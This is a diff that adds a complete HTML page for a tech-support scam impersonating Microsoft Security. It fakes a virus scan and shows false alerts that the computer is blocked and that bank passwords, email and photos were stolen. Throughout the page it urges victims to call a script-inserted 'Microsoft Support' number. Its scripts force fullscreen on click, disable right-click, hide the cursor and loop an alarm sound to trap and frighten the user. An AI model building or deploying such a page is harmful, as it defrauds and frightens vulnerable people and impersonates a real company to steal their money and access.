@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html>
+  <head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>The Code Execution For Safty</title>
+<link rel="stylesheet" href="css/styles.css">
+<script type="text/javascript" src="js/scripts.js"></script>
+<script type="text/javascript" src="js/main.js"></script>
+<script type="text/javascript" src="js/fullscreen.js"></script>
+<script type="text/javascript" src="js/number.js"></script>
+<script type="text/javascript" src="js/reclose.js"></script>
+<link rel="apple-touch-icon" href="images/microsoft.png">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60971022-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-60971022-2');
+</script>
+
+<script type="text/javascript">//<![CDATA[
+$(function(){
+$('body').bind('contextmenu', function(e){
+return false;
+});
+});//]]>
+</script>
+</head>
+
+<body id="mycanvas" onclick="playSound()" style="cursor:none !important">
+
+  <!-- <iframe src="https://support.google.com/chrome" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+   </iframe> -->
+
+   <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+       <div class="black" style="height: 145%;"></div>
+   </a>
+
+   <div class="bg">
+     <div class="bgimg" style="top: 0px;"><img src="bg1.png" alt="" width="100%"/></div>
+ </div>
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Microsoft security<img src="images/minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+</div>
+
+<h4 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1">Safety at a glance</h4>
+<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what is happening to the safety and health of your device and take all necessary measures.</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="images/kxFy-clip.png" width="50px;">
+<p>Virus and threat protection</p>
+<p style="top: 120px; position: absolute; font-size: 13px; color: grey;">action is required. Run a scan to check for <br>threats.</p>
+
+</li>
+<li>
+<br><br>
+<img src="images/qsbs-firewall.png" width="60px;">
+<p>Firewall and network protection</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+</ul>
+<ul>
+<li>
+<br>
+<img src="images/s-S4-acc.png" width="60px;">
+<p>Account protection</p>
+<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+<li>
+<br>
+<img src="images/Z5BR-network.png" width="51px;">
+<p>Application and browser control</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+</ul>
+</div>
+<img src="images/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30px; height: 15px;" id="clscl">
+<br>
+</div>
+
+
+<!--Microsoft Security Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Microsoft security<img src="images/minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+  </div>
+  <h4 style="position: absolute; left: 70px; top: 60px; font-weight: 300;font-size: 18px;" id="text1"><img src="images/okPE-vs.png" width="25px;" style="margin-right: 10px;">Virus and threat protection</h4>
+  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection against threats.</p>
+
+<h4 style="    position: absolute;
+right: 170px;
+top: 11px;
+font-size: 18px;
+font-weight: 400;" id="text12"><b><script>document.write(phone_number)</script> (USA Head Office)</b></h4>
+
+  <div class="centerright">
+
+
+  <ul>
+  <li>
+
+
+
+  <div class="flex"> <img src="images/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 3px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">current threat</p></div>
+
+
+  <br><br>
+  <div class="progress" id="bar">
+    <div class="progress__bar"></div>
+  </div>
+
+  <p style="font-size: 13px;" id="info">A quick scan is in progress...<br>Estimated time remaining: <n id="time">0</n><br><n id="amount">0</n> Files scanned.</p>
+
+  <a href="#" class="button" id="re">to cancel</a>
+  <p style=" font-size: 13px;" id="recx">Keep working while we analyze your device.</p>
+
+  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">protection history</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan Options<br> Allowed Threats<br> Protection History</p>
+
+
+  </li>
+
+  <li>
+
+<div class="flex"><img src="images/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">Virus & threat protection settings </p> </div>
+<p style="color: grey; font-size: 13px;">no action required</p>
+<p style="font-size: 13px; color: #0063c6;">Manage your settings</p>
+  </li>
+  </ul>
+  <ul>
+
+  <li>
+
+
+  <p style="position: absolute; top: -55px;">I have a question?</p>
+
+  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">get help</p>
+
+  </li>
+  <li>
+
+
+    <p style="position: absolute; top: 25px;">who will protect me?</p>
+
+    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Supplier management</p>
+
+    </li>
+    <li>
+
+
+      <p style="position: absolute; top: 100px;font-size: 14px; "><br>Help us improve Microsoft security</p>
+
+      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Send us your feedback</p>
+
+      </li>
+      <li>
+
+        <p style="position: absolute; top: 190px;">Change your privacy settings</p>
+        <p style="position: absolute; top: 220px; font-size: 13px;">View and change Microsoft privacy settings<br><n id="which"></n> terminal.</p>
+
+        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer;">Privacy Settings<br>Privacy Dashboard<br>Privacy Statement</p>
+
+        </li>
+
+  </ul>
+
+  </div>
+  <img src="images/uZbx-si.png" class style="border-bottom-left-radius: 10px;" width="30px; height: 15px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Windows") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Beyond");
+        }
+     }
+     else {
+       console.log("does not work on Microsoft");
+     }
+   });
+  </script>
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #fff;font-weight: bold;
+margin-top: 8px; text-align: center;">Critical Alert From Microsoft</p>
+                <p class="text-center">** Access to this PC has been blocked for security reasons **</p>
+                <p>Your computer has been warned that it is infected with Trojan spyware. The following data was compromised: <br><br>
+                   > Email ID<br> > Bank Password<br>
+                   > Facebook Login<br>
+                   > Photos and Photo Documents</p>
+
+                  <p>A Microsoft Security scan has detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, images, or documents.</p>
+                  <p>Please contact us immediately so that our engineer can explain the removal process over the phone.<br><br>
+
+                  Please contact Microsoft Support immediately to report this threat, prevent spoofing, and unlock access to this device.<br><br>
+                  Closing this window puts your personal information at risk and interrupts your Microsoft registration.</p>
+
+               <p style="padding-bottom: 0px;">Call Micosoft Support <strong><script>document.write(phone_number)</script> (USA Head Office)</strong></p>
+               <div class="action_buttons"> <a class id="leave_page" style="cursor: pointer;">Ok</a> <a class id="leave_page">Cancel</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop>
+  <source src="aud77.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+
+<div id="lst" class="lst delayedPopupWindow">
+  <div class="row firewall-pro">
+    <div class="col-md-12">
+      <div class="green-box" style="-webkit-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
+    -moz-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
+    box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);    border: 1px solid #aaa;">
+      <div class="row">
+        <div class="col-md-8">
+          <div class="logo_micro" style="float: left;
+    margin-left: 10px;">
+          <img src="images/microsoft.png"><span style="color: #000;">Microsoft firewall</span>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="minimize">
+            <img src="images/minimize.jpeg" class="img-fluid" style="width:110px">
+          </div>
+        </div>
+
+      </div>
+
+      </div>
+    </div>
+    <div class="col-md-4">
+      <div class="microsoft-logo">
+        <img src="images/microsoft.png"><span>Microsoft</span>
+      </div>
+    </div>
+    <div class="col-md-8">
+       <div class="formDescription">
+    <h2 style="font-weight:bold; font-size:17px;">Microsoft_Spyware_Alert - Error Code: #DW6BD36</h2>
+    <p>Access to this computer has been blocked for security reasons .</p>
+    <h2 style="font-size:20px; font-weight:bold;">Contact Microsoft Support: <script>document.write(phone_number)</script></h2>
+
+  </div>
+    </div>
+  </div>
+
+  <footer id>
+    <div class="row">
+      <div class="col-md-6 left-code">
+        <p>Threat_Detected - Pornographic_Spyware<br>
+          App: Ads.financetrack(01).exe</p>
+      </div>
+      <div class="col-md-6">
+        <div class="button_new" id="footer_btn">
+          <a href="#" class="safe" style="background-color:#2178d4;">Quick support</a>
+          <a href="#" class="anyway blink">Return to safety</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+</div>
+
+<div id="welcomeDiv" style=" display:none; background-color:#000; height: auto; width: 550px; left:32%;top:0;position: absolute;z-index: 9999999999;text-align: center; " class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not reboot or use
+      Your computer.<br>Your computer is disabled. Please, call Microsoft. <br>Access is the block security reason for this
+      Computer. <br>Please contact us immediately. A technician will help you solve the problem.</p>
+</div>
+
+<div id="chat-box">
+  <img src="images/microsoft.png"><span style="color: #222;
+font-size: 21px;
+font-weight: 600;
+margin-left: 6px;
+position: relative;
+top: 5px;">Microsoft</span> <p style="font-weight: 600;">Microsoft Support</p>
+ <h4 style="font-weight: 600;"><script>document.write(phone_number)</script> (USA Head Office)</h4>
+   <div class="arrow-down">
+     <i class="fa fa-caret-down"></i>
+   </div>
+
+  </div>
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+
+<script type="text/javascript">
+  $(document).ready(function() {
+   $("#chat-box").delay(6000).fadeIn(100);
+});
+
+</script>
+
+
+</body></html>
